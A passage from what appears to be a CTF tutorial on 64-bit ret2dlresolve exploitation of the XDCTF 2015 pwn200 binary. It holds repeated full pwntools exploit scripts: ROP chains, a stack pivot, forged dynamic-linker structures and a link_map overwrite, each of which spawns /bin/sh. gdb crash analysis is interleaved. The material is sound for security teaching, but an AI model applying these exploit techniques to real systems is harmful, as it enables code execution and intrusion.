# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

At this point, we find the program crashes again. Through the coredump

```bash
❯ gdb -c core
```

We find it crashes when handling xmm-related instructions

```
 ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
   0x7fa8677a339b    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33a0    lea    rsi, [rip + 0x39e259]
   0x7fa8677a33a7    xor    edx, edx
   0x7fa8677a33a9    mov    edi, 3
   0x7fa8677a33ae    call   0x7fa8677931c0 <0x7fa8677931c0>
 
   0x7fa8677a33b3    xor    edx, edx
   0x7fa8677a33b5    mov    rsi, rbp
   0x7fa8677a33b8    mov    edi, 2
   0x7fa8677a33bd    call   0x7fa8677931f0 <0x7fa8677931f0>
 
   0x7fa8677a33c2    mov    rax, qword ptr [rip + 0x39badf]
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x600d18 ◂— 0x0
01:0008│      0x600d20 —▸ 0x7fa8679080f7 ◂— 0x2f6e69622f00632d /* '-c' */
02:0010│      0x600d28 ◂— 0x0
03:0018│      0x600d30 —▸ 0x40076a ◂— pop    rbx
04:0020│      0x600d38 —▸ 0x7fa8677a3400 ◂— 0x9be1f8b53
05:0028│      0x600d40 —▸ 0x600d34 ◂— 0x677a340000000000
06:0030│      0x600d48 ◂— 0x8000000000000006
07:0038│      0x600d50 ◂— 0x0

```

Since xmm-related instructions require addresses to be 16-byte aligned, and rsp is not 16-byte aligned at this point, we can simply adjust the stack to make it 16-byte aligned.

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
rop = ROP("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x1a0 # new stack size is 0x1a0
new_stack = bss_addr+0x200

offset = 112+8
rop.raw(offset*'a')
payload1 = csu(0, 1 ,elf.got['read'],0,new_stack,stack_size)
rop.raw(payload1)
rop.raw(0x400607)
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
# gdb.attach(io)
io.send(rop.chain())

# construct fake stack
rop = ROP("./main_no_relro_64")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30,len(dynstr)))  # construct a fake dynstr section
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+len(dynstr),len("/bin/sh\x00")))  # read /bin/sh\x00
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773) # pop rdi; ret
rop.raw(0x600B30+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
# print(len(rop.chain()))
rop.raw('a'*(stack_size-len(rop.chain())))
io.send(rop.chain())


# reuse the vuln to stack pivot
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.migrate(new_stack)
assert(len(rop.chain())<=256)
io.send(rop.chain()+'a'*(256-len(rop.chain())))

# now, we are on the new stack
io.send(p64(0x600B30)) # fake dynstr location
io.send(dynstr) # fake dynstr
io.send("/bin/sh\x00")

io.interactive()
```

The final execution result is as follows

```
❯ python exp-no-relro-stack-pivot.py
[+] Starting local process './main_no_relro_64': pid 41149
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/no-relro/main_no_relro_64'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './main_no_relro_64'
[*] Switching to interactive mode
$ ls
exp-no-relro-stack-pivot.py  main_no_relro_64
```

At this point we find that, unlike in 32-bit, performing a stack pivot followed by ret2dlresolve attack in 64-bit requires careful construction of the stack position to avoid corrupting the content of the .dynamic section.

Here we also present another method: exploiting the vulnerability by using the vuln function multiple times. This approach appears to be clearer.

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_no_relro_64")
elf = ELF("./main_no_relro_64")

bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x400750
csu_end_addr = 0x40076A
leave_ret  =0x40063c
poprbp_ret = 0x400588
def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload

io.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set rsp = new_stack
stack_size = 0x200 # new stack size is 0x200
new_stack = bss_addr+0x100

# modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_no_relro_64")
offset = 112+8
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600988+8,8))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0x600B30+0x100))


# construct a fake dynstr section
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100,len(dynstr)))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(dynstr)

# read /bin/sh\x00
rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,0x600B30+0x100+len(dynstr),len("/bin/sh\x00")))  
rop.raw(0x400607)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send("/bin/sh\x00")


rop = ROP("./main_no_relro_64")
rop.raw(offset*'a')
rop.raw(0x0000000000400771) #pop rsi; pop r15; ret; 
rop.raw(0)
rop.raw(0)
rop.raw(0x0000000000400773)
rop.raw(0x600B30+0x100+len(dynstr))
rop.raw(0x400516) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw('a'*(256-len(rop.chain())))
print(rop.dump())
print(len(rop.chain()))
io.send(rop.chain())
io.interactive()
```

### Partial RELRO

We still use 2015 xdctf pwn200 for the introduction.

```shell
❯ gcc -fno-stack-protector -z relro  -no-pie ../../main.c -o main_partial_relro_64
❯ checksec main_partial_relro_64
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Here we still introduce 64-bit ret2dlresolve using both manual construction and tool-based construction approaches.

#### Manual Forgery

Here we won't demonstrate step by step. We'll directly use the final approach.

##### 64-bit Changes

First, let's look at some of the changes in 64-bit.

By default, glibc uses `ELF_Rela` to record the content of relocation entries when compiled

```c
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
/* How to extract and insert information held in the r_info field.  */
#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

Here Elf64_Addr, Elf64_Xword, and Elf64_Sxword are all 64-bit, so the size of the Elf64_Rela structure is 24 bytes.

From the relocation table information in IDA, we can determine that write's offset in the symbol table is 1 (0x100000007h>>32).

```assembly
LOAD:0000000000400488 ; ELF JMPREL Relocation Table
LOAD:0000000000400488                 Elf64_Rela <601018h, 100000007h, 0> ; R_X86_64_JUMP_SLOT write
LOAD:00000000004004A0                 Elf64_Rela <601020h, 200000007h, 0> ; R_X86_64_JUMP_SLOT strlen
LOAD:00000000004004B8                 Elf64_Rela <601028h, 300000007h, 0> ; R_X86_64_JUMP_SLOT setbuf
LOAD:00000000004004D0                 Elf64_Rela <601030h, 400000007h, 0> ; R_X86_64_JUMP_SLOT read
LOAD:00000000004004D0 LOAD            ends
```

The offset in the symbol table is indeed 1.

```shell
LOAD:00000000004002C0 ; ELF Symbol Table
LOAD:00000000004002C0      Elf64_Sym <0>
LOAD:00000000004002D8      Elf64_Sym <offset aWrite - offset byte_400398, 12h, 0, 0, 0, 0> ; "write"
LOAD:00000000004002F0      Elf64_Sym <offset aStrlen - offset byte_400398, 12h, 0, 0, 0, 0> ; "strlen"
LOAD:0000000000400308      Elf64_Sym <offset aSetbuf - offset byte_400398, 12h, 0, 0, 0, 0> ; "setbuf"
LOAD:0000000000400320      Elf64_Sym <offset aRead - offset byte_400398, 12h, 0, 0, 0, 0> ; "read"
...
```

In 64-bit, the Elf64_Sym structure is

```c
typedef struct
{
  Elf64_Word        st_name;                /* Symbol name (string tbl index) */
  unsigned char        st_info;                /* Symbol type and binding */
  unsigned char st_other;                /* Symbol visibility */
  Elf64_Section        st_shndx;                /* Section index */
  Elf64_Addr        st_value;                /* Symbol value */
  Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
```

Where

- Elf64_Word is 32-bit
- Elf64_Section is 16-bit
- Elf64_Addr is 64-bit
- Elf64_Xword is 64-bit

So, the size of Elf64_Sym is 24 bytes.

Additionally, in 64-bit, the code in plt pushes the index of the symbol to be resolved in the relocation table, rather than the offset. For example, the write function pushes 0.

```assembly
.plt:0000000000400510 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:0000000000400510 _write          proc near               ; CODE XREF: main+B3↓p
.plt:0000000000400510                 jmp     cs:off_601018
.plt:0000000000400510 _write          endp
.plt:0000000000400510
.plt:0000000000400516 ; ---------------------------------------------------------------------------
.plt:0000000000400516                 push    0
.plt:000000000040051B                 jmp     sub_400500
```

##### First Try - leak

Based on the above analysis, we can write the following script

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

However, after simply running it, we find the program crashes.

```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*RAX  0x4003f6 ◂— 0x2000200020000
*RBX  0x601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fe00aa8e250 (write) ◂— lea    rax, [rip + 0x2e06a1]
*RCX  0x155f100000007
*RDX  0x155f1
*RDI  0x400398 ◂— 0x6f732e6362696c00
*RSI  0x601158 ◂— 0x1200200db8
*R8   0x0
 R9   0x7fe00af7a4c0 ◂— 0x7fe00af7a4c0
*R10  0x7fe00af98170 ◂— 0x0
 R11  0x246
*R12  0x6161616161616161 ('aaaaaaaa')
*R13  0x6161616161616161 ('aaaaaaaa')
*R14  0x6161616161616161 ('aaaaaaaa')
*R15  0x6161616161616161 ('aaaaaaaa')
*RBP  0x6161616161616161 ('aaaaaaaa')
*RSP  0x7fffb43c82a0 ◂— 0x0
*RIP  0x7fe00ad7eeb4 (_dl_fixup+116) ◂— movzx  eax, word ptr [rax + rdx*2]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7fe00ad7eeb4 <_dl_fixup+116>    movzx  eax, word ptr [rax + rdx*2]
   0x7fe00ad7eeb8 <_dl_fixup+120>    and    eax, 0x7fff
   0x7fe00ad7eebd <_dl_fixup+125>    lea    rdx, [rax + rax*2]
   0x7fe00ad7eec1 <_dl_fixup+129>    mov    rax, qword ptr [r10 + 0x2e0]
   0x7fe00ad7eec8 <_dl_fixup+136>    lea    r8, [rax + rdx*8]
   0x7fe00ad7eecc <_dl_fixup+140>    mov    eax, 0
   0x7fe00ad7eed1 <_dl_fixup+145>    mov    r9d, dword ptr [r8 + 8]
   0x7fe00ad7eed5 <_dl_fixup+149>    test   r9d, r9d
   0x7fe00ad7eed8 <_dl_fixup+152>    cmove  r8, rax
   0x7fe00ad7eedc <_dl_fixup+156>    mov    edx, dword ptr fs:[0x18]
   0x7fe00ad7eee4 <_dl_fixup+164>    test   edx, edx
```

Through debugging, we find the program is trying to get the corresponding version number

- rax is 0x4003f6, pointing to the version number array
- rdx is 0x155f1, the symbol table index, which is also the version number index

At the same time, rax + rdx*2 is 0x42afd8, and this address is not in mapped memory.

```
pwndbg> print /x $rax + $rdx*2
$1 = 0x42afd8
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x600000           0x601000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
          0x601000           0x602000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64
    0x7fe00a97e000     0x7fe00ab65000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ab65000     0x7fe00ad65000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad65000     0x7fe00ad69000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad69000     0x7fe00ad6b000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7fe00ad6b000     0x7fe00ad6f000 rw-p     4000 0      
    0x7fe00ad6f000     0x7fe00ad96000 r-xp    27000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af79000     0x7fe00af7b000 rw-p     2000 0      
    0x7fe00af96000     0x7fe00af97000 r--p     1000 27000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af97000     0x7fe00af98000 rw-p     1000 28000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7fe00af98000     0x7fe00af99000 rw-p     1000 0      
    0x7fffb43a9000     0x7fffb43cb000 rw-p    22000 0      [stack]
    0x7fffb43fb000     0x7fffb43fe000 r--p     3000 0      [vvar]
    0x7fffb43fe000     0x7fffb4400000 r-xp     2000 0      [vdso]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

Can we find a way to make it fall within mapped memory? That's probably difficult

- The bss start address is 0x601050, so the minimum index value is (0x601050-0x400398)/24=87517, i.e., 0x4003f6 + 87517*2 = 0x42afb0
- The maximum usable bss address is 0x601fff, with a corresponding index value of (0x601fff-0x400398)/24=87684, i.e., 0x4003f6 + 87684*2 = 0x42b0fe

Clearly all are in non-mapped memory regions. Therefore, we need to consider other approaches. By reading the dl_fixup code

```c
        // 获取符号的版本信息
        const struct r_found_version *version = NULL;
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum = (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

We find that if we set l->l_info[VERSYMIDX(DT_VERSYM)] to NULL, the program won't execute the code below, the version number will be NULL, and the code can execute normally. However, this means we need to know the address of link_map. The first entry of the GOT table (0x601008 in this example) stores the address of link_map.

Therefore, we can

- Leak the address at that location
- Set l->l_info[VERSYMIDX(DT_VERSYM)] to NULL
- Finally execute the exploitation script

From the assembly code, we can see that the offset of l->l_info[VERSYMIDX(DT_VERSYM)] is 0x1c8

```assembly
 ► 0x7fa4b09f7ea1 <_dl_fixup+97>     mov    rax, qword ptr [r10 + 0x1c8]
   0x7fa4b09f7ea8 <_dl_fixup+104>    xor    r8d, r8d
   0x7fa4b09f7eab <_dl_fixup+107>    test   rax, rax
   0x7fa4b09f7eae <_dl_fixup+110>    je     _dl_fixup+156 <_dl_fixup+156>
```

Therefore, we can simply modify the exp.

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data)

rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
sh = "/bin/sh\x00"
bin_sh_addr = store_addr+len(resolve_data)
rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

Unfortunately, it still crashes. But the good news this time is that it did execute up to the system function. Through debugging, we can find that the system function encountered a problem when further calling execve

```assembly
 ► 0x7f7f3f74d3ec <do_system+1180>       call   execve <execve>
        path: 0x7f7f3f8b20fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7ffe63677000 —▸ 0x7f7f3f8b20ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7ffe636770a8 ◂— 0x10000
```

The environment variable address points to an unexpected address — this is likely because we corrupted stack data during the ROP. We can adjust to make it NULL or try to avoid corrupting the original data as much as possible. Here we choose to make it NULL.

First, we can merge the ROP for reading the forged data and the /bin/sh part together to reduce the number of ROP rounds

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
    # r12 should be the function that you want to call
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    payload = p64(csu_end_addr)
    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    return payload


def ret2dlresolve_x64(elf, store_addr, func_name, resolve_addr):
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    
    rel_plt = elf.get_section_by_name('.rela.plt').header.sh_addr
    relaent = elf.dynamic_value_by_tag("DT_RELAENT") # reloc entry size

    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    syment = elf.dynamic_value_by_tag("DT_SYMENT") # symbol entry size

    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr


    # construct fake function string
    func_string_addr = store_addr
    resolve_data = func_name + "\x00"
    
    # construct fake symbol
    symbol_addr = store_addr+len(resolve_data)
    offset = symbol_addr - dynsym
    pad = syment - offset % syment # align syment size
    symbol_addr = symbol_addr+pad
    symbol = p32(func_string_addr-dynstr)+p8(0x12)+p8(0)+p16(0)+p64(0)+p64(0)
    symbol_index = (symbol_addr - dynsym)/24
    resolve_data +='a'*pad
    resolve_data += symbol

    # construct fake reloc 
    reloc_addr = store_addr+len(resolve_data)
    offset = reloc_addr - rel_plt
    pad = relaent - offset % relaent # align relaent size
    reloc_addr +=pad
    reloc_index = (reloc_addr-rel_plt)/24
    rinfo = (symbol_index<<32) | 7
    write_reloc = p64(resolve_addr)+p64(rinfo)+p64(0)
    resolve_data +='a'*pad
    resolve_data +=write_reloc
    
    resolve_call = p64(plt0) + p64(reloc_index)
    return resolve_data, resolve_call
    

io.recvuntil('Welcome to XDCTF2015~!\n')
gdb.attach(io)

store_addr = bss_addr+0x100
sh = "/bin/sh\x00"

# construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location
rop = ROP("./main_partial_relro_64")
offset = 112+8
rop.raw(offset*'a')
resolve_data, resolve_call = ret2dlresolve_x64(elf, store_addr, "system",elf.got["write"])
rop.raw(csu(0, 1 ,elf.got['read'],0,store_addr,len(resolve_data)+len(sh)))  
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
assert(len(rop.chain())<=256)
io.send(rop.chain())
# send resolve data
io.send(resolve_data+sh)
bin_sh_addr = store_addr+len(resolve_data)


# rop = ROP("./main_partial_relro_64")
# rop.raw(offset*'a')
# sh = "/bin/sh\x00"
# bin_sh_addr = store_addr+len(resolve_data)
# rop.raw(csu(0, 1 ,elf.got['read'],0,bin_sh_addr,len(sh)))
# rop.raw(vuln_addr)
# rop.raw("a"*(256-len(rop.chain())))
# io.send(rop.chain())
# io.send(sh)


# leak link_map addr
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['write'],1,0x601008,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
link_map_addr = u64(io.recv(8))
print(hex(link_map_addr))


# set l->l_info[VERSYMIDX(DT_VERSYM)] =  NULL
rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(csu(0, 1 ,elf.got['read'],0,link_map_addr+0x1c8,8))
rop.raw(vuln_addr)
rop.raw("a"*(256-len(rop.chain())))
io.send(rop.chain())
io.send(p64(0))


rop = ROP("./main_partial_relro_64")
rop.raw(offset*'a')
rop.raw(0x00000000004007a3) # 0x00000000004007a3: pop rdi; ret; 
rop.raw(bin_sh_addr)
rop.raw(resolve_call)
# rop.raw('a'*(256-len(rop.chain())))
io.send(rop.chain())
io.interactive()
```

At this point, let's try again and find

```assembly
 ► 0x7f5a187703ec <do_system+1180>       call   execve <execve>
        path: 0x7f5a188d50fa ◂— 0x68732f6e69622f /* '/bin/sh' */
        argv: 0x7fff68270410 —▸ 0x7f5a188d50ff ◂— 0x2074697865006873 /* 'sh' */
        envp: 0x7fff68270538 ◂— 0x6161616100000000
```

At this point, the only contaminated data in envp is 0x61, which is our padding data 'a'. That's easy to handle — we just need to replace all padding with `\x00`.

```python
from pwn import *
# context.log_level="debug"
# context.terminal = ["tmux","splitw","-h"]
context.arch="amd64"
io = process("./main_partial_relro_64")
elf = ELF("./main_partial_relro_64")

bss_addr = elf.bss()
csu_front_addr = 0x400780
csu_end_addr = 0x40079A
vuln_addr = 0x400637

def csu(rbx, rbp, r12, r13, r14, r15):
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx = 0
    # rbp = 1, enable not to jump
